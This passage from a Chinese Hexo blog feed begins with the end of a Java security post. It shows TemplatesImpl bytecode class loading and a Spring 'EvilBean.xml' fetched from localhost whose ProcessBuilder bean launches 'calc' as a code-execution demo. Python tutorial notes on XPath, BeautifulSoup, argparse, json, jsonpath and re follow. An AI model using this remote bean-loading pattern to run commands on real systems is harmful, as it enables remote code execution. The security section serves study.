class="hljs-string">&quot;yv66vgAAADQAIQoABgASCQATABQIABUKABYAFwcAGAcAGQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApFeGNlcHRpb25zBwAaAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABjxpbml0PgEAAygpVgEAClNvdXJjZUZpbGUBABdIZWxsb1RlbXBsYXRlc0ltcGwuamF2YQwADgAPBwAbDAAcAB0BABNIZWxsbyBUZW1wbGF0ZXNJbXBsBwAeDAAfACABABJIZWxsb1RlbXBsYXRlc0ltcGwBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQAQamF2YS9sYW5nL1N5c3RlbQEAA291dAEAFUxqYXZhL2lvL1ByaW50U3RyZWFtOwEAE2phdmEvaW8vUHJpbnRTdHJlYW0BAAdwcmludGxuAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWACEABQAGAAAAAAADAAEABwAIAAIACQAAABkAAAADAAAAAbEAAAABAAoAAAAGAAEAAAAIAAsAAAAEAAEADAABAAcADQACAAkAAAAZAAAABAAAAAGxAAAAAQAKAAAABgABAAAACgALAAAABAABAAwAAQAOAA8AAQAJAAAALQACAAEAAAANKrcAAbIAAhIDtgAEsQAAAAEACgAAAA4AAwAAAA0ABAAOAAwADwABABAAAAACABE=&quot;</span>);        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();        setFieldValue(obj, <span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][] &#123;            code        &#125;);        setFieldValue(obj, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;HelloTemplatesImpl&quot;</span>);        setFieldValue(obj, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());        obj.newTransformer();    &#125;</code></pre></div><h2 id="Spring类加载"><a href="#Spring类加载" class="headerlink" title="Spring类加载"></a>Spring类加载</h2><p>创建类的实例化对象过程中会执行构造代码块、无参构造函数|有参构造函数</p><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.springframework.context.support.ClassPathXmlApplicationContext;<span class="hljs-keyword">import</span> org.springframework.context.support.FileSystemXmlApplicationContext;<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">test</span> &#123;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;        <span class="hljs-type">String</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&lt;http://localhost:8000/EvilBean.xml&gt;&quot;</span>;        <span class="hljs-keyword">new</span> <span class="hljs-title class_">ClassPathXmlApplicationContext</span>(url);        <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileSystemXmlApplicationContext</span>(url);    &#125;&#125;</code></pre></div><p>EvilBean.xml</p><div class="code-wrapper"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span> ?&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">beans</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;&lt;http://www.springframework.org/schema/beans&gt;&quot;</span> <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;&lt;http://www.w3.org/2001/XMLSchema-instance&gt;&quot;</span> <span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">&quot;     &lt;http://www.springframework.org/schema/beans&gt; &lt;http://www.springframework.org/schema/beans/spring-beans.xsd&gt;&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;pb&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;java.lang.ProcessBuilder&quot;</span> <span class="hljs-attr">init-method</span>=<span class="hljs-string">&quot;start&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">constructor-arg</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">list</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span>calc<span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">list</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">constructor-arg</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">bean</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">beans</span>&gt;</span></code></pre></div>]]></content>
    
    
    <categories>
      
      <category>网络安全</category>
      
      <category>Java安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Java安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Python爬虫</title>
    <link href="/%E7%BC%96%E7%A8%8B%E6%8A%80%E6%9C%AF/Python/Python%E7%88%AC%E8%99%AB/"/>
    <url>/%E7%BC%96%E7%A8%8B%E6%8A%80%E6%9C%AF/Python/Python%E7%88%AC%E8%99%AB/</url>
    
    <content type="html"><![CDATA[<h1 id="爬虫"><a href="#爬虫" class="headerlink" title="爬虫"></a>爬虫</h1><h1 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h1><h2 id="HTML"><a href="#HTML" class="headerlink" title="HTML"></a>HTML</h2><h3 id="HTML文档示例"><a href="#HTML文档示例" class="headerlink" title="HTML文档示例"></a>HTML文档示例</h3><h3 id="CSS选择器"><a href="#CSS选择器" class="headerlink" title="CSS选择器"></a>CSS选择器</h3><h2 id="XML"><a href="#XML" class="headerlink" title="XML"></a>XML</h2><h3 id="XML文档示例"><a href="#XML文档示例" class="headerlink" title="XML文档示例"></a>XML文档示例</h3><div class="code-wrapper"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;ISO-8859-1&quot;</span>?&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">bookstore</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">book</span>&gt;</span>     <span class="hljs-tag">&lt;<span class="hljs-name">title</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;eng&quot;</span>&gt;</span>Harry Potter<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">price</span>&gt;</span>29.99<span class="hljs-tag">&lt;/<span class="hljs-name">price</span>&gt;</span> <span class="hljs-tag">&lt;/<span class="hljs-name">book</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">book</span>&gt;</span>     <span class="hljs-tag">&lt;<span class="hljs-name">title</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;eng&quot;</span>&gt;</span>Learning XML<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">price</span>&gt;</span>39.95<span class="hljs-tag">&lt;/<span class="hljs-name">price</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">book</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">bookstore</span>&gt;</span></code></pre></div><h3 id="XPath"><a href="#XPath" class="headerlink" title="XPath"></a>XPath</h3><p>XPath 是一门在 XML 文档中查找信息的语言。XPath 使用路径表达式来选取 XML 文档中的节点或节点集。节点是通过沿着路径 (path) 或者步 (steps) 来选取的。</p><hr><h3 id="选取节点"><a href="#选取节点" class="headerlink" title="选取节点"></a>选取节点</h3><p>XPath 使用路径表达式在 XML 文档中选取节点。节点是通过沿着路径或者 step 来选取的。 下面列出了最有用的路径表达式：</p><table><thead><tr><th>表达式</th><th>描述</th></tr></thead><tbody><tr><td>nodename</td><td>选取此节点的所有子节点。</td></tr><tr><td>&#x2F;</td><td>从根节点选取。</td></tr><tr><td>&#x2F;&#x2F;</td><td>从匹配选择的当前节点选择文档中的节点，而不考虑它们的位置。</td></tr><tr><td>.</td><td>选取当前节点。</td></tr><tr><td>..</td><td>选取当前节点的父节点。</td></tr><tr><td>@</td><td>选取属性。</td></tr></tbody></table><p><strong>语法示例</strong></p><table><thead><tr><th>路径表达式</th><th>结果</th></tr></thead><tbody><tr><td>bookstore</td><td>选取 bookstore 元素的所有子节点。</td></tr><tr><td>&#x2F;bookstore</td><td>选取根元素 bookstore。注释：假如路径起始于正斜杠( &#x2F; )，则此路径始终代表到某元素的绝对路径！</td></tr><tr><td>bookstore&#x2F;book</td><td>选取属于 bookstore 的子元素的所有 book 元素。</td></tr><tr><td>&#x2F;&#x2F;book</td><td>选取所有 book 子元素，而不管它们在文档中的位置。</td></tr><tr><td>bookstore&#x2F;&#x2F;book</td><td>选择属于 bookstore 元素的后代的所有 book 元素，而不管它们位于 bookstore 之下的什么位置。</td></tr><tr><td>&#x2F;&#x2F;@lang</td><td>选取名为 lang 的所有属性。</td></tr></tbody></table><p><strong>提示：</strong>如果 XPath 的开头是一个斜线（&#x2F;）代表这是绝对路径。如果开头是两个斜线（&#x2F;&#x2F;）表示文件中所有符合模式的元素都会被选出来，即使是处于树中不同的层级也会被选出来。</p><hr><h3 id="谓语（Predicates）"><a href="#谓语（Predicates）" class="headerlink" title="谓语（Predicates）"></a>谓语（Predicates）</h3><p>谓语用来查找某个特定的节点或者包含某个指定的值的节点。谓语被嵌在方括号中。</p><p><strong>语法示例</strong></p><table><thead><tr><th>路径表达式</th><th>结果</th></tr></thead><tbody><tr><td>&#x2F;bookstore&#x2F;book[1]</td><td>选取属于 bookstore 子元素的第一个 book 元素。</td></tr><tr><td>&#x2F;bookstore&#x2F;book[last()]</td><td>选取属于 bookstore 子元素的最后一个 book 元素。</td></tr><tr><td>&#x2F;bookstore&#x2F;book[last()-1]</td><td>选取属于 bookstore 子元素的倒数第二个 book 元素。</td></tr><tr><td>&#x2F;bookstore&#x2F;book[position()&lt;3]</td><td>选取最前面的两个属于 bookstore 元素的子元素的 book 元素。</td></tr><tr><td>&#x2F;&#x2F;title[@lang]</td><td>选取所有拥有名为 lang 的属性的 title 元素。</td></tr><tr><td>&#x2F;&#x2F;title[@lang&#x3D;’eng’]</td><td>选取所有 title 元素，且这些元素拥有值为 eng 的 lang 属性。</td></tr><tr><td>&#x2F;bookstore&#x2F;book[price&gt;35.00]</td><td>选取 bookstore 元素的所有 book 元素，且其中的 price 元素的值须大于 35.00。</td></tr><tr><td>&#x2F;bookstore&#x2F;book[price&gt;35.00]&#x2F;title</td><td>选取 bookstore 元素中的 book 元素的所有 title 元素，且其中的 price 元素的值须大于 35.00。</td></tr></tbody></table><h3 id="选取未知节点"><a href="#选取未知节点" class="headerlink" title="选取未知节点"></a>选取未知节点</h3><p>XPath 通配符可用来选取未知的 XML 元素。</p><table><thead><tr><th>通配符</th><th>描述</th></tr></thead><tbody><tr><td>*</td><td>匹配任何元素节点。</td></tr><tr><td>@*</td><td>匹配任何属性节点。</td></tr><tr><td>node()</td><td>匹配任何类型的节点。</td></tr></tbody></table><p><strong>语法示例</strong></p><table><thead><tr><th>路径表达式</th><th>结果</th></tr></thead><tbody><tr><td>&#x2F;bookstore&#x2F;*</td><td>选取 bookstore 元素的所有子元素。</td></tr><tr><td>&#x2F;&#x2F;*</td><td>选取文档中的所有元素。</td></tr><tr><td>&#x2F;&#x2F;title[@*]</td><td>选取所有带有属性的 title 元素。</td></tr></tbody></table><h3 id="选取若干路径"><a href="#选取若干路径" class="headerlink" title="选取若干路径"></a>选取若干路径</h3><p>通过在路径表达式中使用“|”运算符，您可以选取若干个路径。</p><p>在下面的表格中，我们列出了一些路径表达式，以及这些表达式的结果：</p><table><thead><tr><th>路径表达式</th><th>结果</th></tr></thead><tbody><tr><td>&#x2F;&#x2F;book&#x2F;title</td><td>&#x2F;&#x2F;book&#x2F;price</td></tr><tr><td>&#x2F;&#x2F;title</td><td>&#x2F;&#x2F;price</td></tr><tr><td>&#x2F;bookstore&#x2F;book&#x2F;title</td><td>&#x2F;&#x2F;price</td></tr></tbody></table><h2 id="Json"><a href="#Json" class="headerlink" title="Json"></a>Json</h2><h3 id="Json数据示例"><a href="#Json数据示例" class="headerlink" title="Json数据示例"></a>Json数据示例</h3><h3 id="Json选择器"><a href="#Json选择器" class="headerlink" title="Json选择器"></a>Json选择器</h3><h2 id="JavaScript"><a href="#JavaScript" class="headerlink" title="JavaScript"></a>JavaScript</h2><h1 id="常用标准库"><a href="#常用标准库" class="headerlink" title="常用标准库"></a>常用标准库</h1><h2 id="re"><a href="#re" class="headerlink" title="re"></a>re</h2><p>re.findall：在字符串中找到正则表达式所匹配的所有子串，并返回一个列表</p><h2 id="json"><a href="#json" class="headerlink" title="json"></a>json</h2><h2 id="with-open"><a href="#with-open" class="headerlink" title="with open"></a>with open</h2><h1 id="数据请求库"><a href="#数据请求库" class="headerlink" title="数据请求库"></a>数据请求库</h1><h2 id="urllib3"><a href="#urllib3" class="headerlink" title="urllib3"></a>urllib3</h2><h2 id="requests"><a href="#requests" class="headerlink" title="requests"></a>requests</h2><h2 id="Selenium"><a href="#Selenium" class="headerlink" title="Selenium"></a>Selenium</h2><p><strong>important</strong>：<a href="https://www.cnblogs.com/haifeima/tag/selenium/">https://www.cnblogs.com/haifeima/tag/selenium/</a></p><h1 id="数据解析库"><a href="#数据解析库" class="headerlink" title="数据解析库"></a>数据解析库</h1><h2 id="BeautifulSoup"><a href="#BeautifulSoup" class="headerlink" title="BeautifulSoup"></a>BeautifulSoup</h2><p>功能：使用<strong>html解析器</strong>将<strong>html文档数据</strong>解析成<strong>结构化的树形数据</strong>，每一个节点都是python对象。</p><h3 id="HTML解析器"><a href="#HTML解析器" class="headerlink" title="HTML解析器"></a>HTML解析器</h3><p>html.parser：python标准库</p><p>lxml</p><p>html5lib</p><h3 id="HTML文档数据"><a href="#HTML文档数据" class="headerlink" title="HTML文档数据"></a>HTML文档数据</h3><p>获取方式：1、通过requests请求获取。2、通过打开html文件获取。等等</p><h3 id="结构化树形节点"><a href="#结构化树形节点" class="headerlink" title="结构化树形节点"></a>结构化树形节点</h3><h3 id="用法"><a href="#用法" class="headerlink" title="用法"></a>用法</h3><p>导入</p><div class="code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> bs4 <span class="hljs-keyword">import</span> BeautifulSoupsoup = BeautifulSoup(html_content,html_parser)</code></pre></div><h2 id="lxml"><a href="#lxml" class="headerlink" title="lxml"></a>lxml</h2><p>功能：用于解析xml或html数据</p><h2 id="jsonpath"><a href="#jsonpath" class="headerlink" title="jsonpath"></a>jsonpath</h2><h1 id="数据存储库"><a href="#数据存储库" class="headerlink" title="数据存储库"></a>数据存储库</h1>]]></content>
    
    
    <categories>
      
      <category>编程技术</category>
      
      <category>Python</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Python常用模块</title>
    <link href="/%E7%BC%96%E7%A8%8B%E6%8A%80%E6%9C%AF/Python/Python%E6%95%99%E7%A8%8B/"/>
    <url>/%E7%BC%96%E7%A8%8B%E6%8A%80%E6%9C%AF/Python/Python%E6%95%99%E7%A8%8B/</url>
    
    <content type="html"><![CDATA[<h1 id="argparse"><a href="#argparse" class="headerlink" title="argparse"></a>argparse</h1><p>参考：<a href="https://docs.python.org/zh-cn/3/library/argparse.html#">https://docs.python.org/zh-cn/3/library/argparse.html#</a></p><p>命令行参数选项</p><h2 id="使用步骤"><a href="#使用步骤" class="headerlink" title="使用步骤"></a>使用步骤</h2><p><strong>创建解析器对象</strong></p><div class="code-wrapper"><pre><code class="hljs python">parser = argparse.ArgumentParser()</code></pre></div><p>常用参数：</p><ul><li>prog：程序的名称。默认值：os.path.basename(sys.argv[0])</li><li>usage：描述程序用途的字符串。默认从添加到解析器的参数生成。</li><li>description：程序的描述信息。在选项参数的描述信息之前。</li><li>epilog：程序的额外描述信息。在选项参数的描述信息之后。</li></ul><p><strong>添加参数</strong></p><div class="code-wrapper"><pre><code class="hljs stylus">parser<span class="hljs-selector-class">.add_argument</span>()<span class="hljs-function"><span class="hljs-title">add_argument_group</span><span class="hljs-params">()</span></span>添加多个参数组</code></pre></div><p>add_argument()常用参数</p><ul><li><p>name or flags：设置选项的名字，可以是单个字符(-f)，也可以是一个字符串列表(-f, –file)</p></li><li><p>action：指定选项参数如何处理，默认是store动作</p><div class="code-wrapper"><pre><code class="hljs vbnet">常用值：<span class="hljs-symbol">store:</span> 默认的action值，将参数值存储起来供后续使用。<span class="hljs-symbol">store_true:</span> 将<span class="hljs-literal">True</span>值存储起来，通常用于表示启用一个开关选项。<span class="hljs-symbol">store_false:</span> 将<span class="hljs-literal">False</span>值存储起来，通常用于表示禁用一个开关选项。**不为该参数指定值也可以运行</code></pre></div></li><li><p>nargs：表示该选项值的个数，一个或多个，值为通配符 + ？等</p></li><li><p>default：选项没有指定值时，使用的默认值</p></li><li><p>type：参数值的数据类型，默认是字符串格式。</p></li><li><p>required：该选项参数是否为必须</p></li><li><p>help：为选项参数设置帮助文本信息</p></li><li><p>dest：用于指定参数值在<code>args</code>对象中的名字。默认情况下，<code>argparse</code>会基于参数名称作为该参数的名称</p></li></ul><p><strong>解析参数</strong></p><div class="code-wrapper"><pre><code class="hljs ocaml"><span class="hljs-keyword">parser</span>.parse_args<span class="hljs-literal">()</span></code></pre></div><p>参数：</p><ul><li>args：要解析的字符串列表。默认是从sys.argv获取。</li><li>namespace：用于获取属性的对象。默认值是一个新的Namespace对象</li></ul><h1 id="json"><a href="#json" class="headerlink" title="json"></a>json</h1><h2 id="json-load"><a href="#json-load" class="headerlink" title="json.load()"></a>json.load()</h2><p><strong>功能</strong>：从<strong>文件对象</strong>中加载字符串转换为对应的python对象格式</p><p><strong>语法</strong></p><div class="code-wrapper"><pre><code class="hljs">参数：</code></pre></div><p><strong>返回值</strong></p><p>各种python对象</p><h3 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h3><div class="code-wrapper"><pre><code class="hljs python">--------------code-------------------<span class="hljs-comment">#json1.txt</span>&#123;<span class="hljs-string">&quot;name&quot;</span>:<span class="hljs-string">&quot;jmy&quot;</span>,<span class="hljs-string">&quot;age&quot;</span>: <span class="hljs-number">22</span>&#125;<span class="hljs-comment">#json2.txt</span>[<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>]<span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;json1.txt&quot;</span>,<span class="hljs-string">&quot;r&quot;</span>,encoding=<span class="hljs-string">&quot;utf8&quot;</span>) <span class="hljs-keyword">as</span> f1:    result1 = json.load(f1)<span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;json2.txt&quot;</span>,<span class="hljs-string">&quot;r&quot;</span>,encoding=<span class="hljs-string">&quot;utf8&quot;</span>) <span class="hljs-keyword">as</span> f2:    result2 = json.load(f2)<span class="hljs-built_in">print</span>(<span class="hljs-built_in">type</span>(result1))<span class="hljs-built_in">print</span>(result1)<span class="hljs-built_in">print</span>(<span class="hljs-built_in">type</span>(result2))<span class="hljs-built_in">print</span>(result2)--------------output-----------------&lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;dict&#x27;</span>&gt;&#123;<span class="hljs-string">&#x27;name&#x27;</span>: <span class="hljs-string">&#x27;jmy&#x27;</span>, <span class="hljs-string">&#x27;age&#x27;</span>: <span class="hljs-number">22</span>&#125;&lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;list&#x27;</span>&gt;[<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>]</code></pre></div><h2 id="json-loads"><a href="#json-loads" class="headerlink" title="json.loads()"></a>json.loads()</h2><p><strong>功能</strong>：将字符串转换为<strong>对应的Python对象</strong></p><p><strong>语法</strong></p><div class="code-wrapper"><pre><code class="hljs">参数：</code></pre></div><p><strong>返回值</strong></p><p>各种python对象</p><h3 id="示例-1"><a href="#示例-1" class="headerlink" title="示例"></a>示例</h3><div class="code-wrapper"><pre><code class="hljs python">--------------code-------------------json_str = <span class="hljs-string">&#x27;&#123;&quot;name&quot;: &quot;John&quot;, &quot;age&quot;: 30, &quot;city&quot;: &quot;New York&quot;&#125;&#x27;</span>data1 = json.loads(json_str)<span class="hljs-built_in">print</span>(<span class="hljs-built_in">type</span>(data1))<span class="hljs-built_in">print</span>(data1)  <span class="hljs-comment"># &#123;&#x27;name&#x27;: &#x27;John&#x27;, &#x27;age&#x27;: 30, &#x27;city&#x27;: &#x27;New York&#x27;&#125;</span>json_str = <span class="hljs-string">&#x27;[1, 2, 3, 4, 5]&#x27;</span>data2 = json.loads(json_str)<span class="hljs-built_in">print</span>(<span class="hljs-built_in">type</span>(data2))<span class="hljs-built_in">print</span>(data2)  <span class="hljs-comment"># [1, 2, 3, 4, 5]</span>--------------output-----------------&lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;dict&#x27;</span>&gt;&#123;<span class="hljs-string">&#x27;name&#x27;</span>: <span class="hljs-string">&#x27;John&#x27;</span>, <span class="hljs-string">&#x27;age&#x27;</span>: <span class="hljs-number">30</span>, <span class="hljs-string">&#x27;city&#x27;</span>: <span class="hljs-string">&#x27;New York&#x27;</span>&#125;&lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;list&#x27;</span>&gt;[<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>]</code></pre></div><h2 id="json-dump"><a href="#json-dump" class="headerlink" title="json.dump()"></a>json.dump()</h2><p><strong>功能</strong>：将Python对象转换为JSON字符串，并将它写入文件</p><p><strong>语法</strong></p><div class="code-wrapper"><pre><code class="hljs">参数：</code></pre></div><p><strong>返回值</strong></p><p>无</p><h3 id="示例-2"><a href="#示例-2" class="headerlink" title="示例"></a>示例</h3><div class="code-wrapper"><pre><code class="hljs python">--------------code-------------------<span class="hljs-comment"># Python对象</span>data = &#123;    <span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;John&quot;</span>,    <span class="hljs-string">&quot;age&quot;</span>: <span class="hljs-number">30</span>,    <span class="hljs-string">&quot;city&quot;</span>: <span class="hljs-string">&quot;New York&quot;</span>&#125;<span class="hljs-comment"># 将Python对象转换为JSON字符串并写入文件</span><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;data.json&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>) <span class="hljs-keyword">as</span> file:    json.dump(data, file)--------------output-----------------</code></pre></div><h2 id="json-dumps"><a href="#json-dumps" class="headerlink" title="json.dumps()"></a>json.dumps()</h2><p><strong>功能</strong>：将Python对象转换为JSON格式的字符串</p><p><strong>语法</strong></p><div class="code-wrapper"><pre><code class="hljs">参数：</code></pre></div><p><strong>返回值</strong></p><p>字符串</p><h3 id="示例-3"><a href="#示例-3" class="headerlink" title="示例"></a>示例</h3><div class="code-wrapper"><pre><code class="hljs python">--------------code-------------------<span class="hljs-comment"># Python对象</span>data = &#123;    <span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;John&quot;</span>,    <span class="hljs-string">&quot;age&quot;</span>: <span class="hljs-number">30</span>,    <span class="hljs-string">&quot;city&quot;</span>: <span class="hljs-string">&quot;New York&quot;</span>&#125;<span class="hljs-comment"># 将Python对象转换为JSON字符串</span>json_str = json.dumps(data)<span class="hljs-comment"># 打印JSON字符串</span><span class="hljs-built_in">print</span>(<span class="hljs-built_in">type</span>(json_str))<span class="hljs-built_in">print</span>(json_str)--------------output-----------------&lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;str&#x27;</span>&gt;&#123;<span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;John&quot;</span>, <span class="hljs-string">&quot;age&quot;</span>: <span class="hljs-number">30</span>, <span class="hljs-string">&quot;city&quot;</span>: <span class="hljs-string">&quot;New York&quot;</span>&#125;</code></pre></div><h1 id="jsonpath"><a href="#jsonpath" class="headerlink" title="jsonpath"></a>jsonpath</h1><h2 id="jsonpath-1"><a href="#jsonpath-1" class="headerlink" title="jsonpath()"></a>jsonpath()</h2><p><strong>功能</strong>：根据jsonpath表达式在字典中匹配数据</p><p><strong>语法</strong></p><div class="code-wrapper"><pre><code class="hljs mipsasm"><span class="hljs-keyword">jsonpath(dict, </span><span class="hljs-keyword">json_path)</span><span class="hljs-keyword"></span>参数：<span class="hljs-keyword">dict: </span>字典数据<span class="hljs-symbol">expression:</span> <span class="hljs-keyword">jsonpath表达式</span></code></pre></div><p><strong>返回值</strong></p><p>返回列表</p><h3 id="示例-4"><a href="#示例-4" class="headerlink" title="示例"></a>示例</h3><div class="code-wrapper"><pre><code class="hljs python">--------------code-------------------<span class="hljs-keyword">import</span> json<span class="hljs-keyword">from</span> jsonpath <span class="hljs-keyword">import</span> jsonpath<span class="hljs-comment"># JSON 数据</span>data = <span class="hljs-string">&quot;&quot;&quot;</span><span class="hljs-string">&#123;</span><span class="hljs-string">  &quot;store&quot;: &#123;</span><span class="hljs-string">    &quot;book&quot;: [</span><span class="hljs-string">      &#123;</span><span class="hljs-string">        &quot;category&quot;: &quot;fiction&quot;,</span><span class="hljs-string">        &quot;author&quot;: &quot;John Doe&quot;,</span><span class="hljs-string">        &quot;title&quot;: &quot;Book 1&quot;</span><span class="hljs-string">      &#125;,</span><span class="hljs-string">      &#123;</span><span class="hljs-string">        &quot;category&quot;: &quot;nonfiction&quot;,</span><span class="hljs-string">        &quot;author&quot;: &quot;Jane Smith&quot;,</span><span class="hljs-string">        &quot;title&quot;: &quot;Book 2&quot;</span><span class="hljs-string">      &#125;</span><span class="hljs-string">    ],</span><span class="hljs-string">    &quot;bicycle&quot;: &#123;</span><span class="hljs-string">      &quot;color&quot;: &quot;red&quot;,</span><span class="hljs-string">      &quot;price&quot;: 19.99</span><span class="hljs-string">    &#125;</span><span class="hljs-string">  &#125;</span><span class="hljs-string">&#125;</span><span class="hljs-string">&quot;&quot;&quot;</span><span class="hljs-comment"># 将 JSON 数据解析为字典对象</span>json_data = json.loads(data)<span class="hljs-comment"># 使用 jsonpath 获取匹配的元素</span>expression = <span class="hljs-string">&quot;$.store.book[1].title&quot;</span>result = jsonpath(json_data,expression)<span class="hljs-built_in">print</span>(<span class="hljs-built_in">type</span>(result))<span class="hljs-built_in">print</span>(result)--------------output-----------------&lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;list&#x27;</span>&gt;[<span class="hljs-string">&#x27;Book 2&#x27;</span>]</code></pre></div><h1 id="re"><a href="#re" class="headerlink" title="re"></a>re</h1><h2 id="re-compile"><a href="#re-compile" class="headerlink" title="re.compile()"></a>re.compile()</h2><p><strong>功能</strong>：将字符串编译成正则表达式匹配模式</p><p><strong>语法</strong>：</p><div class="code-wrapper"><pre><code class="hljs python">re.<span class="hljs-built_in">compile</span>(<span class="hljs-built_in">str</span>)参数：<span class="hljs-built_in">str</span>：字符串</code></pre></div><p><strong>返回值</strong></p><div class="code-wrapper"><pre><code class="hljs">无</code></pre></div><h3 id="示例-5"><a href="#示例-5" class="headerlink" title="示例"></a>示例</h3><div class="code-wrapper"><pre><code class="hljs python">--------------code-------------------str1 = <span class="hljs-string">&quot;[0-9]&quot;</span>expr = re.<span class="hljs-built_in">compile</span>(str1)<span class="hljs-built_in">print</span>(<span class="hljs-built_in">type</span>(expr))<span class="hljs-built_in">print</span>(expr)--------------output-----------------&lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;re.Pattern&#x27;</span>&gt;re.<span class="hljs-built_in">compile</span>(<span class="hljs-string">&#x27;[0-9]&#x27;</span>)</code></pre></div><h2 id="re-findall"><a href="#re-findall" class="headerlink" title="re.findall()"></a>re.findall()</h2><p><strong>功能</strong>：从字符串中匹配所有符合匹配表达式的字符串</p><p><strong>语法</strong></p><div class="code-wrapper"><pre><code class="hljs avrasm">re.findall(expr,str)参数：<span class="hljs-symbol">expr:</span>正则表达式<span class="hljs-symbol">str:</span>字符串内容</code></pre></div><p><strong>返回值</strong></p><p>列表</p><h3 id="示例-6"><a href="#示例-6" class="headerlink" title="示例"></a>示例</h3><div class="code-wrapper"><pre><code class="hljs python">--------------code-------------------str1 = <span class="hljs-string">&quot;[0-9]&quot;</span>str2 = <span 